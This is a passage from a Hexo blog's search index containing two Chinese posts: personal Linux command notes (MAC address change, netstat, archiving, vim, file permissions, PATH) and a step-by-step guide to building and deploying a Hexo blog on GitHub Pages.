class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down #down掉eth0,再改Mac地址时，需要先执行这步</span><br><span class="line">maccharger -m 00:11:11:11:11:11 eth0 #改Mac地址</span><br><span class="line">ifconfig eth0 up #up eth0</span><br></pre></td></tr></table></figure><p><strong>修改的Mac只有在本次使用，改过后可能会上不了网，因为无线路由器绑定了mac地址，下次开机会恢复真实值</strong></p><p><code>netstat</code><br>查看网络的连接信息<br>配角： <code>egrep</code> <code>awk</code> <code>cut</code> <code>sort</code> <code>unip</code> <code>&gt;</code> <code>|</code><br>-pantu tu为tcp,udp连接信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu | egrep -v '0.0.0.0|:::' | awk '&#123;print $5&#125;' | egrep 'and|Address' | cut -d ':' -f 1 | sort | uniq &gt; ip</span><br></pre></td></tr></table></figure><blockquote><p>命令行解读:<br>查看tcp,udp连接信息，筛除掉0.0.0.0和:::的信息,只显示第五块（列）,又筛除and和Address, 查看以”:”为界分的第一块，排序，重复只显示一次，最终 <strong>覆盖</strong> 输出到ip内.<br>“&gt;”改为”&gt;&gt;”追加输出到ip内。<br>awk 和 cut 都是对行操作。<br>管道：| 将多个命令在同一行输入，可以协作。</p></blockquote><p><code>mount</code><br>挂载目录操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop klai.iso /media/cdrom #将kali.iso挂载到目标目录下</span><br></pre></td></tr></table></figure><p><code>dmesg</code><br>查看message内容</p><p><code>echo</code><br>在当前窗口显示某些信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "hello world!"</span><br></pre></td></tr></table></figure><p><code>ping</code><br>-c 次数</p><p><code>cal</code><br>查看日历</p><p><code>date</code><br>查看时间</p><h3 id="压缩-归档"><a href="#压缩-归档" class="headerlink" title="压缩 归档"></a>压缩 归档</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gzip ***.gz </span><br><span class="line">gzip -d ***.gz</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bzip2 ***.gz</span><br><span class="line">bzip2 -d ***.gz</span><br></pre></td></tr></table></figure><p><code>tar</code><br>归档<br>-c 创建归档文件<br>-v 输出详细信息<br>-f 表示使用归档文件<br>-x 解开归档文件<br>-t 列表查看包内的文件（不释放解包）<br>-C 指定释放位置<br>-p 解包时保留原始文件及目录的权限<br>-z/j 调用gzip/bzip2程序 进行解压或压缩 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">归档打包，解包</span></span><br><span class="line">tar -cvf 4.tar 1 2 3 //将文件1 2 3 打包归档为4.tar</span><br><span class="line">tar -xvf 4.tar //解包归档文件4.tar </span><br><span class="line"><span class="meta">#</span><span class="bash">压缩，解压</span></span><br><span class="line">gzip 4.tar 4.tar.gz </span><br><span class="line">tar zxvf 4.tar.gz  //解压</span><br><span class="line"><span class="meta">#</span><span class="bash">压缩，解压</span></span><br><span class="line">bzip2 4.tar 4.tar.bz2</span><br><span class="line">tar jxvf 4.tar.bz2  //解压</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>；无逻辑关系，顺序执行<br>|    依次执行，每个都执行，前一个的正确输出作后一个的操作对象<br>&amp;   依次执行，每个都执行<br>&amp;&amp; 逻辑与，依次执行，执行成功则下一个，失败则退出<br>||    逻辑或，依次执行，执行成功则退出，失败则下一个</p><h3 id="关机重启"><a href="#关机重启" class="headerlink" title="关机重启"></a>关机重启</h3><p>halt：关机<br>reboot:重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who  查看目前有谁在线</span><br><span class="line">netstat -a #查看联机状态</span><br><span class="line">ps -aus #后台执行的程序</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">指令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">sync</td><td align="left">数据同步写入磁盘</td></tr><tr><td align="left">shutdown</td><td align="left">常用关机命令</td></tr><tr><td align="left">halt</td><td align="left">关机命令，进入系统停止的模式</td></tr><tr><td align="left">poweroff</td><td align="left">关机命令，进入关机模式，直接关机没有提供电力欧</td></tr><tr><td align="left">reboot</td><td align="left">直接重启</td></tr><tr><td align="left">suspend</td><td align="left">进入休眠模式</td></tr></tbody></table><p><strong>关机指令大同小异，习惯用哪个就用哪个</strong></p><p><code>shutdown</code></p><p>-h 20:35 关机+时间</p><p>-r +30 “the system will reboot” 重启+时间</p><p>-k now “the system will reboot” 警告，但不会真关机，吓唬人的</p><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p><code>rpm</code>红帽的包格式<br><code>apt</code><br><code>yum</code><br><code>dpkg</code></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><blockquote><p>set mouse-=a  #鼠标右键全部功能开启，可跨文本</p></blockquote><p><strong>命令模式</strong><br>dd    //删除光标行（剪切）<br>ndd    //删除多行， 例2dd<br>u    //撤销<br>p    //（剪切后）粘贴<br>D    //从光标处删除至行尾</p><p>A 行尾<br>I 行首<br>a 光标后<br>i 光标前<br>O 上一行插入<br>o 下一行插入</p><p><strong>插入模式</strong><br>esc返回命令模式</p><p><strong>底行模式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">: set nu</span><br><span class="line">: wq</span><br><span class="line">: q!</span><br><span class="line">: w</span><br><span class="line">/ 关键字#向下搜索 n 下一个</span><br><span class="line">？关键字#向上搜索</span><br><span class="line">: %s/XX/YY/g#全文替换,XX改为YY,g为不提示</span><br><span class="line">: 1,5s/XX/YY/g#1到5行</span><br><span class="line">: .#重复上一条命令</span><br><span class="line">: u#消上一条命令</span><br></pre></td></tr></table></figure><hr><h2 id="shell快捷键"><a href="#shell快捷键" class="headerlink" title="shell快捷键"></a>shell快捷键</h2><p>ctrl+l:清屏<br>ctrl+u/k:清空至行首/尾<br>:强行换行<br>tab：命令补全,文件补齐<br>Ctrl+c：退出，相当于exit<br>Ctrl+ins：vim模式<strong>复制</strong>，相当于普通模式的 Ctrl+c<br>Shift+ins：vim模式<strong>粘贴</strong>，相当于普通模式的 Ctrl+v<br>Shift+PgUp/PgDn：上下翻页</p><h2 id="改变文件属性与权限"><a href="#改变文件属性与权限" class="headerlink" title="改变文件属性与权限"></a>改变文件属性与权限</h2><p>chgrp ：改变文件所属群组<br>chown ：改变文件拥有者<br>chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性</p><blockquote><p>chgrp 要被改变的组名必须要在/etc/group 文件内<em>存在</em>才行，否则就会显示错误<br>chown 要注意的是， 用户必须是<em>已经存在</em>系统中的账号，也就是在/etc/passwd 这个文件中有纪录的用户名称才能改变</p></blockquote><h3 id="改变群组"><a href="#改变群组" class="headerlink" title="改变群组"></a>改变群组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] 群组名 文件或目录</span><br></pre></td></tr></table></figure><p>选项与参数：<br>-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件、目录都更新成为这个群组之意。常常用在变更某一目录内所有的文件之情况。</p><h3 id="拷贝文件，改变所属："><a href="#拷贝文件，改变所属：" class="headerlink" title="拷贝文件，改变所属："></a>拷贝文件，改变所属：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp .bashrc .bashrc_test</span><br><span class="line">ls -la .bashrc*   #查看到仍然属于root</span><br><span class="line">chown bin .bashrc</span><br></pre></td></tr></table></figure><h3 id="改变权限"><a href="#改变权限" class="headerlink" title="改变权限"></a>改变权限</h3><p><strong>数字类型改变文件权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] xyz 文件或目录</span><br></pre></td></tr></table></figure><p>选项与参数：<br>xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。<strong>r:4,w:2,x:1</strong><br>-R : 进行递归(recursive)的持续变更，亦即连同次<em>目录</em>下的所有文件都会变更</p><p>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数<br>则是：<br>owner = rwx = 4+2+1 = 7<br>group = rwx = 4+2+1 = 7<br>others= — = 0+0+0 = 0<br>所以等一下我们设定权限的变更时，该文件的权限数字就是 770 啦！<br>变更权限的指令 chmod 的语法是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] 770 文件或目录</span><br></pre></td></tr></table></figure><p><strong>符号类型改变文件权限</strong><br>u:user,g:grope,e:others,a:all<br>+:加入，-：除去，=：设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u&#x3D;rwx,go&#x3D;rx .bashrc #注意喔！那个 u&#x3D;rwx,go&#x3D;rx 是连在一起的，中间并没有任何空格符！</span><br><span class="line">chmod a+w .bashrc  #全部加写权限</span><br><span class="line">ls -al .bashrc</span><br></pre></td></tr></table></figure><blockquote><p>对于文件的 rwx 来说， 主要都是针对『文件的内容』而言，与文件档名的存在与否没有关系喔！因为文件记录的是实际的数据嘛</p></blockquote><table><thead><tr><th>组件</th><th>内容</th><th>迭代物件</th><th>r</th><th>w</th><th>x</th></tr></thead><tbody><tr><td>文件</td><td>详细资料data</td><td>文件文件夹</td><td>读到文件内容</td><td>修改文件内容</td><td>执行文件内容</td></tr><tr><td>目录</td><td>档名</td><td>可分类抽屉</td><td>读到档名</td><td>修改档名</td><td>进入该目录的权限(key)</td></tr></tbody></table><h3 id="默认文件权限"><a href="#默认文件权限" class="headerlink" title="默认文件权限"></a>默认文件权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">umask</span> <span class="comment">#查看当前默认权限</span></span><br><span class="line"><span class="built_in">umask</span> -S <span class="comment">#查看详细权限信息</span></span><br><span class="line"><span class="built_in">umask</span> 022</span><br></pre></td></tr></table></figure><h3 id="隐藏属性"><a href="#隐藏属性" class="headerlink" title="隐藏属性"></a>隐藏属性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chattr +a filename <span class="comment">#文件可追加，不可覆盖 </span></span><br><span class="line">       -i filename <span class="comment">#文件不可做修改，删除</span></span><br><span class="line">lsattr -a <span class="comment">#查看文件全部隐藏属性</span></span><br><span class="line">       -d <span class="comment">#若是文件夹，则只查看文件夹隐藏属性</span></span><br><span class="line">       -R <span class="comment">#递归</span></span><br></pre></td></tr></table></figure><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><p>有以下这些特殊权限：SUID，SGID，SBIT<br>Set UID：当一个档案的拥有者的x权限位上是 s 的时候，此时被称为Set UID ,简称SUID的特殊权限。SUID有以下限制和功能：<br>  SUID权限仅对二进制程序有效，执行者对于该程序需要具有x的权限，本权限仅在执行该程序过程中有效，执行者将具有该程序拥有者的权限<br>Set GID：当一个档案的用户组的 x 权限位为 s 的时候，此时被称为Set GID，简称SGID。SGID有如下功能:<br>  SGID对二进制程序有用，程序执行者对于该程序，需要具备x的权限，执行者在执行程序的过程中会获得该程序用户组的权限<br>SBIT：只对目录有效，对文件无效。作用是：<br>  当用户对此目录具有wx权限，即有写入权限时，当用户在该目录下建立目录或者文件时，仅有自己和root才有权力删除。<br>那么如何配置SUID与SGID呢？用数字权限法，在原来的三个数字之前再加一个数字，它们的值分别是：SUID :4 ；SGID：2 ；SBIT：1 。</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure><p>添加环境变量,将root目录添加到PATH中，可以在任何目录下，执行root目录下的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=“$&#123;PATH&#125;:/root”</span><br></pre></td></tr></table></figure><p>tmp是任何用户都能访问的目录，若将.目录加入到PATH中，则会变得很危险。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>Hexo + Github 搭建 Blog 和 每次博客的部署</p><hr><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.安装git</p><p>git下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号，皆为成功<br>git version 2.19.2.windows.1</p><p>2.安装node（其附带npm）</p><p>node.js下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号(安装最新版本)：<br>v10.14.1</p><p>3.安装Hexo<br>命令行输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>4.创建本地运行库</p><p>创建本地仓库文件夹：例F:\github<br>右键点击该文件夹，Git Bash Here，命令行输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init myblog</span><br></pre></td></tr></table></figure><p>初始化完成！</p><h2 id="本地试运行"><a href="#本地试运行" class="headerlink" title="本地试运行"></a>本地试运行</h2><p>1.进入博客根目录（myblog）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog</span><br></pre></td></tr></table></figure><p>2.安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>3.运行<br>本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>此时在浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ,访问到博客界面 </p><h2 id="部署在远程库"><a href="#部署在远程库" class="headerlink" title="部署在远程库"></a>部署在远程库</h2><p>这里将其部署在github上</p><p>1.创建Github账户</p><p>略，随便百度一下</p><p>2.创建github项目</p><p>创建一个名为yourname.github.io的项目（yourname为你github名）</p><p>3.生成密钥，用于ssh连接</p><p>在本地，右键网站根目录，点击Git Bash 输入下列命令<br>yourname 即为github注册时的用户名<br>youremail 为注册时的邮箱账号<br>第三条命令生成密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config --global user.email <span class="string">"yourEmail"</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">"yourEmail"</span></span><br></pre></td></tr></table></figure><p>此时在C:\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。</p><p>4.修改配置文件</p><p>去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>5.将本地仓库同步到github</p><p>在第一次生成以及部署之前，需要安装一个扩展：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>清除生成的静态网页缓存数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><p>生成文章对应的静态页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>部署本地站点到github命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
